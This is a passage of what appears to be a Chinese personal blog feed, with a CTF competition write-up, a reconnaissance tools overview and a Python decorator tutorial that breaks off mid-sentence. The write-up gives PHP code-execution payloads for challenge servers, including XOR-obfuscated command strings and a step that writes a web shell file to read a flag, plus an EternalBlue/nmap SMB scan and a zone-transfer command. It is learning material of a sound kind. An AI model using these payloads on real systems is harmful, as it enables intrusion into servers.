error!其中使用[]通配符绕过c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%00%06%00&quot;^&quot;%60%60%60%20%2f%60%2a&quot;);</code></pre><p><strong>HardPHP</strong></p><pre><code>&lt;?php// not only ++error_reporting(0);highlight_file(__FILE__);if (isset($_POST[&#39;NKCTF&#39;])) &#123;    $NK = $_POST[&#39;NKCTF&#39;];    if (is_string($NK)) &#123;        if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,$NK) &amp;&amp; strlen($NK) &lt; 105)&#123;            eval($NK);        &#125;else&#123;            echo(&quot;hacker!!!&quot;);        &#125;    &#125;else&#123;        phpinfo();    &#125;&#125;?&gt;【1】利用自增方法NKCTF=$_=(_/_._)[&#39;$&#39;==&#39;_&#39;];$_++;$__=$_.$_++;$_++;$_++;$_++;$__.=$_;$_++;$_=_.$__.$_;$$_[_]($$_[__]);&amp;_=readfile&amp;__=/flag【2】先传ShellNKCTF=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&amp;___=shell_exec&amp;_=echo &#39;&lt;?php eval($_POST[1])?&gt;&#39; &gt;1.php     再输出FLAG1=echo file_get_contents(&#39;/flag&#39;);</code></pre><p><strong>EasyPMS</strong></p><pre><code>禅道系统存在命令执行和权限绕过漏洞，根据0Day漏洞的POC执行就行了</code></pre><h5 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h5><p><strong>Blue取证磁盘</strong></p><pre><code>【预期解】使用永恒之蓝攻击【非预期解】虚拟机直接导入先扫出IP地址使用nmap尝试扫描其他smb漏洞      nmap -P --script=smb-vuln*  IP利用ms09的CVE获取Shell然后打开【严重非预期解】WinHex一把嗦</code></pre><p><strong>三体</strong><br><a href="https://www.bilibili.com/video/BV1Ai4y1V7rg/">老题目了</a></p><pre><code>from PIL import Imagedef decode(im):    width, height = im.size    lst = [ ]    for y in range(height):        for x in range(width):            red, green, blue = im.getpixel((x, y))            if (blue | green | red) == 0:                break                        index = (green &lt;&lt; 8) + blue            lst.append( chr(index) )    return &#39;&#39;.join(lst)def main(filename: str):    all_text = decode(Image.open(filename))    with open(&quot;&#123;&#125;_decode.txt&quot;.format(&#39;.&#39;.join(filename.split(&#39;.&#39;)[:-1])), &quot;w&quot;, encoding = &quot;utf-8&quot;) as f:        f.write(all_text)if __name__ == &#39;__main__&#39;:    main(&#39;三体.bmp&#39;)</code></pre><p><strong>THMaster东方星莲船打到10亿分</strong></p><pre><code>【1】简简单单网上找修改器改分数【2】CheatEngine修改游戏数据</code></pre><p><strong>easy_rgb</strong></p><pre><code>用Kali的工具gaps具体指令自己网上找然后发现三个文档r.txt   g.txt   b.txt按照rgb的顺序每次读一位字符得到压缩包字节流r = &quot;5b04000d663f400000006c6e747a434fbc7d0225c4060b2905cf0a280807372873460041100000ba56b200000000000000006c6e7400000110ea63055a596785d14500010000600745213&quot;g = &quot;0040000ba56b2000000066778f4ac280276f9fb28fb3c282b4fdf7d8a0944bc722bd65b0410083a5492004008200000000006677800000008cc73d1c7630a5f595b000001500800015d38&quot;b = &quot;4310083a54920040080061247309bcac200235fff7778acdfc0401090b3a37c1fcf3000204000d663f40000004000020000061247a20000004dd5985a5d14663000600000a0000004332&quot;data = &quot;&quot;for i in range(len(r)):    try:        data += r[i] + g[i] + b[i]    except:        breakdata += r[-1] + g[-1]with open(&#39;flag.zip&#39;, &#39;wb&#39;) as f:    f.write(bytes.fromhex(data))</code></pre><p><strong>easy_word</strong></p><pre><code>提示如下:小明这个笨蛋，给文档设置了一个密码，但是他自己却忘记了密码，他知道以下信息：1.密码是数学和大小写英语的随机生成的2.hash函数：输出大小 256 bits 内部大小 256 区块大小    512 长度大小 64 字符尺寸 323.密码：h??vO??0 (?号部分为小明已经忘记的位置)  哈希：b75d1224 ... (后面不记得了...)写脚本跑一下import hashlibchars = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;for c1 in chars:    for c2 in chars:        for c3 in chars:            for c4 in chars:                password = &quot;h&#123;&#125;&#123;&#125;vO&#123;&#125;&#123;&#125;0&quot;.format(c1, c2, c3, c4)                hashcode = hashlib.sha256(password.encode()).hexdigest()                if hashcode[:8] == &quot;b75d1224&quot;:                    print(&quot;&#123;&#125;   &#123;&#125;&quot;.format(password, hashcode))                    h4evOF90   b75d1224d1321f5acfe0fb499ff02ab0f15d199e227c77c84c1162340bc6c771发现有一个图片猜测是LSB，直接解密</code></pre><p><strong>first_spam_of_rabbit_year</strong></p><pre><code>文档底下的社会主义核心价值观编码解码为：rabbit 又 move再用佛又曰得出的文本有不可显示字符零宽解密   https://offdev.net/demos/zwsp-steg-js将key和密文清除零宽后分别解密得到新密文最后用rabbit解密   https://www.codeeeee.com/encrypt/rabbit.html</code></pre><p><strong>easy_bmp</strong></p><pre><code>修改宽并使用脚本爆破高显示出部分key解压出一个二维码扫得flag</code></pre><p><strong>baby_music</strong></p><pre><code>WinHex打开发现全是1027和1127盲猜是二进制数据，把1027改为0,1127改为1得到一个zip，里面有脚本压缩包的提示为摩斯密码猜测明文攻击 echo -n &quot;89504E470D0A1A0A0000000D49484452&quot; | xxd -r -ps &gt; png_header</code></pre><p><strong>easymusic</strong></p><pre><code>提示OpenPuff，需要三个密码用notepad++打开音频文件发现第一个密码Kali安装Audacity选择spectrogram进行频谱分析得到一个密码选择波形分析，发现对应二进制的01变化，高电平表示1，低电平表示0，二进制数转换成字符串得到第三个密码最后提取出隐藏Flag</code></pre><p><strong>easy_pic</strong></p><pre><code>formast分离出一个图片010编辑器分析出隐藏数据得到一个照片PS更改宽高得到隐藏Flag</code></pre><h5 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h5><p><strong>Signin</strong><br>不会。</p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>反正感觉这次比赛还是有很大作用的，以后继续努力（敷衍中，睡觉了）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;前话&quot;&gt;&lt;a href=&quot;#前话&quot; class=&quot;headerlink&quot; title=&quot;前话&quot;&gt;&lt;/a&gt;前话&lt;/h5&gt;&lt;p&gt;这次CTF比赛对我来说难度感觉适中偏难吧，很多题都是可以写的&lt;br&gt;只是因为比赛是团队合作，所以就把难题留给大哥们了。&lt;br&gt;当然，这不是重</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>说点啥好呢？</title>
    <link href="https://liu1272.github.io/2023/03/21/%E8%AF%B4%E7%82%B9%E5%95%A5%E5%A5%BD%E5%91%A2%EF%BC%9F/"/>
    <id>https://liu1272.github.io/2023/03/21/%E8%AF%B4%E7%82%B9%E5%95%A5%E5%A5%BD%E5%91%A2%EF%BC%9F/</id>
    <published>2023-03-20T16:38:00.000Z</published>
    <updated>2023-03-20T16:38:58.121Z</updated>
    
    <content type="html"><![CDATA[<p><strong>我现在在写的文章是一个完整的系列，也是我学习的路线。</strong><br><strong>如果你有仔细看就会发现它一开始就不是针CTF竞赛的。</strong><br><strong>所以这个系列（或许可以这么说吧哈哈）很大概率会持续更新下去。</strong><br><strong>对于下个部分的内容，我在考虑</strong><br><strong>是<code>穷举篇</code>还是<code>SQL注入绕过技术篇</code>还是<code>文件上传篇</code>。</strong><br><strong>反正到时候写出来就知道了。</strong><br><strong>还有，我对待这个博客仍然是个人博客的态度</strong><br><strong>不指望也不希望太多人传之类的。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;我现在在写的文章是一个完整的系列，也是我学习的路线。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;如果你有仔细看就会发现它一开始就不是针CTF竞赛的。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;所以这个系列（或许可以这么说吧哈哈）很大概率会持续更新下去。&lt;/str</summary>
      
    
    
    
    <category term="闲聊" scheme="https://liu1272.github.io/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="闲聊" scheme="https://liu1272.github.io/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>说点啥好呢？</title>
    <link href="https://liu1272.github.io/2023/03/21/%E7%8A%B9%E8%B1%AB/"/>
    <id>https://liu1272.github.io/2023/03/21/%E7%8A%B9%E8%B1%AB/</id>
    <published>2023-03-20T16:29:47.000Z</published>
    <updated>2023-03-20T16:38:31.964Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集概述</title>
    <link href="https://liu1272.github.io/2023/03/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%A6%82%E8%BF%B0/"/>
    <id>https://liu1272.github.io/2023/03/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%A6%82%E8%BF%B0/</id>
    <published>2023-03-20T15:45:00.000Z</published>
    <updated>2023-03-20T16:29:34.560Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h4><p>旁站：是和目标网站在同一台服务器上的其它的网站。<br>C段：是和目标服务器ip处在同一个C段的其它服务器。<br>ARL资产侦查灯塔：快速发现并整理企业外网资产并为资产构建基础数据库的工具（想要的自己找）</p><h4 id="收集操作"><a href="#收集操作" class="headerlink" title="收集操作"></a>收集操作</h4><p>Whois操作<br>Kali系统中，Whois己经默认安装，只需输入要查询的域名即可</p><pre><code>whois  +  域名（一般域名不包含主机名，如·baidu.com）</code></pre><p>网站查询及反查<br><a href="https://whois.chinaz.com/">站长之家</a><br><a href="https://site.ip138.com/">IP查询网</a><br><a href="https://whois.aliyun.com/">阿里云查询</a></p><p>备案查询<br><a href="https://www.beianx.cn/">ICP备案查询网</a><br><a href="http://www.tianyancha.como/">天眼查</a></p><p>收集子域名信息<br><a href="https://searchdns.netcraft.com/">网站查询</a><br><a href="https://dnsdumpster.com/">DNSdumpster网站查询</a></p><p>通过查看网站的证书</p><p>利用域传送漏洞</p><pre><code>原理:一台备用服务器使用来自主服务器的数据刷新系的域（zone）数据库     但许多DNS服务器却被错误地配置成只要有client发出请求     就会向对方提供一个zone数据库的详细信息（没有身份认证）利用:（1）Kali的dig工具             dig axfr @DNS服务器 要查询的域名     （2）nslookup工具     （3）nmap工具</code></pre><p>子域名检测</p><pre><code>（1）Layer子域名挖掘机（2）K8（3）wydomain（4）Sublist3r dnsmaper（5）subDomainsBrute（6）Maltego CE（7）dnsrecon(kali自带)重点推荐Layer子域名挖掘机、Sublist3r和subDomainsBrute</code></pre><p>证书透明度公开曰志枚举</p><pre><code>（1）首推好用网站：https://crt.sh（2）次推好用网站：https://censys.io/（3）其他网站：https://phpinfo.me/domain</code></pre><p>通过DNS解析找到IP地址</p><pre><code>（1）ping（2）nslookup（3）dig工具（4）dnsenum工具（5）站长之家</code></pre><p>谷歌搜索（其实百度也还行）</p><pre><code>关键字            说明site            指定域名inurl           URL 中存在关键字的网页intext          网页正文中的关键字filetype        指定文件类型intitie         网页标题中的关键字link            link:baidu.com 即表示返回所有和 baidu.com 做了链接的URLinfo            查找指定站点的一些基本信息cache           搜索Google 里关于某些内容的缓存关键字尽量用“”引起来    </code></pre><p>网络空间搜索引擎（AMAZING MIGHTYYYY!!!!）<br><a href="https://www.zoomeye.org/">钟馗之眼zoomeye</a><br><a href="https://www.shodan.io/">傻蛋Shodan</a><br><a href="https://fofa.info/">佛法FOFA</a></p><p>CMS及Web指纹识别</p><pre><code>御剑Web 指纹识别、WebRobo 、椰树、轻量WEB指纹识别建议WhatWeb（Kali自带）</code></pre><p><a href="http://whatweb.bugscaner.com/look/">BugScaner</a><br><a href="http://www.yunsee.cn/finger.html">云悉指纹</a><br><a href="https://whatweb.net/">WhatWeb</a></p><p>收集网站目录及隐藏的敏感文件</p><pre><code>（1）DirBuster（2）御剑后台扫描珍藏版（3）wwwscan（4）Spinder.py（5）Sensitivefilescan（6）Weakfilescan</code></pre><h5 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h5><p>自己想办法。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>无论人生上了哪一层台阶 ，阶下有人在仰望你，阶上亦有人在俯视你；</strong><br><strong>你抬头自卑，低头自得，唯有平视，才能看到真实的自已。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一些基本概念&quot;&gt;&lt;a href=&quot;#一些基本概念&quot; class=&quot;headerlink&quot; title=&quot;一些基本概念&quot;&gt;&lt;/a&gt;一些基本概念&lt;/h4&gt;&lt;p&gt;旁站：是和目标网站在同一台服务器上的其它的网站。&lt;br&gt;C段：是和目标服务器ip处在同一个C段的其它服务器。</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python</title>
    <link href="https://liu1272.github.io/2023/03/19/Python/"/>
    <id>https://liu1272.github.io/2023/03/19/Python/</id>
    <published>2023-03-18T16:55:10.741Z</published>
    <updated>2023-03-18T16:55:15.984Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Python装饰器&amp;流处理技术</title>
    <link href="https://liu1272.github.io/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/"/>
    <id>https://liu1272.github.io/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/</id>
    <published>2023-03-18T16:54:25.000Z</published>
    <updated>2023-03-18T16:55:05.472Z</updated>
    
    <content type="html"><![CDATA[<p>当在装饰器中使用全局变量时，需要注意以下几点：</p><ol><li>在装饰器中声明全局变量需要使用<code>global</code>关键字。</li><li>在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发<code>NameError</code>异常。</li><li>全局变量可能会被多个线程或进程访问，因此需要考虑并发安全问题。</li><li>在装饰器中使用全局变量可能会导致代码的可读性和可维护性降低，因此应尽可能避免使用全局变量。<br>以下是一个简单的例子，演示如何在装饰器中使用全局变量：<pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">counter</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">global</span> count     count <span class="token operator">+=</span> <span class="token number">1</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; was called &amp;#123;count&amp;#125; times."</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token keyword">return</span> wrapper@counter<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 1 times.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 2 times.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>在上面的例子中，我们定义了一个全局变量<code>count</code>，并在装饰器<code>counter</code>中使用了它。装饰器<code>counter</code>用于统计函数被调用的次数，每次调用时<code>count</code>加1，并输出调用次数。函数<code>foo</code>被装饰后，每次调用都会输出调用次数。</li></ol><p>是的，Python装饰器里可以使用 <code>global</code> 关键字。 </p><p>装饰器本质上是一个函数，因此它可以访问任何全局变量。如果您希望在装饰器内部更改全局变量的值，则需要在函数内部将变量声明为全局变量。在 Python 中，您可以使用 <code>global</code> 关键字来实现这一点。</p><p>以下是一个示例装饰器，它使用全局变量来记录函数调用次数：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们使用 <code>global</code> 关键字声明了 <code>count</code> 变量，并在 <code>count_calls</code> 装饰器函数的 <code>wrapper</code> 函数内部对其进行了修改。每次调用 <code>my_function</code> 函数时，装饰器都会增加 <code>count</code> 的值，并打印出调用次数。除了在装饰器函数内部使用 <code>global</code> 关键字，还可以在装饰器函数外部使用 <code>global</code> 关键字来声明全局变量，并在装饰器内部访问和修改该变量的值。下面是一个示例：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> count    <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hi there!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们声明了全局变量 <code>count</code>，并在装饰器内部和外部使用了 <code>global</code> 关键字。在 <code>my_function</code> 函数内部，我们检查 <code>count</code> 的值是否为偶数，并打印不同的消息。由于装饰器在每次调用 <code>my_function</code> 函数时都会增加 <code>count</code> 的值，因此 <code>my_function</code> 函数每次都会打印不同的消息。</p><p>需要注意的是，在使用全局变量时要小心，因为全局变量可能会在代码中的任何地方进行修改，这可能会导致出现意外的行为。因此，最好将全局变量用于只读目的，或者在使用时采用适当的同步机制来避免竞争条件。当然，除了 <code>global</code> 关键字之外，还可以使用其他的方式来在装饰器中引用外部变量。以下是一些常用的方法：</p><ol><li>使用闭包：在装饰器函数内部定义一个内部函数，并在内部函数中引用外部变量。由于内部函数可以访问外部函数的变量，因此可以通过闭包的方式在装饰器内部使用外部变量。例如：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            nonlocal count            count <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper    <span class="token keyword">return</span> decorator@count_calls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们在装饰器函数 <code>count_calls</code> 内部定义了一个内部函数 <code>decorator</code>，并在该函数中定义了变量 <code>count</code>。在 <code>wrapper</code> 函数内部，我们使用 <code>nonlocal</code> 关键字来引用 <code>count</code> 变量，并在每次调用被装饰的函数时增加其值。</p><ol start="2"><li>使用类：将装饰器实现为一个类，并在类中引用外部变量。由于类实例可以存储变量状态，因此可以通过类的方式在装饰器内部使用外部变量。例如：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">CountCalls</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>func <span class="token operator">=</span> func        self<span class="token punctuation">.</span>count <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;self.func.__name__&amp;#125; has been called &amp;#123;self.count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>@CountCalls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们定义了一个类 <code>CountCalls</code>，并在类的构造函数中定义了变量 <code>count</code>。在 <code>__call__</code> 方法中，我们使用 <code>self.count</code> 来引用 <code>count</code> 变量，并在每次调用被装饰的函数时增加其值。</p><p>无论是使用 <code>global</code> 关键字、闭包还是类，都可以在装饰器中引用外部变量。选择哪种方法取决于具体的需求和个人偏好。除了在装饰器中使用 <code>global</code> 关键字或闭包或类等方式引用外部变量，还可以将变量作为参数传递给装饰器。这种方式通常适用于装饰器函数需要访问某些变量，但不希望将这些变量声明为全局变量的情况。以下是一个示例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            nonlocal count            count <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper    <span class="token keyword">return</span> decorator@count_calls<span class="token punctuation">(</span>count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们将变量 <code>count</code> 作为参数传递给 <code>count_calls</code> 装饰器，并在装饰器函数 <code>decorator</code> 内部使用 <code>nonlocal</code> 关键字引用该变量。在每次调用被装饰的函数时，我们都会增加 <code>count</code> 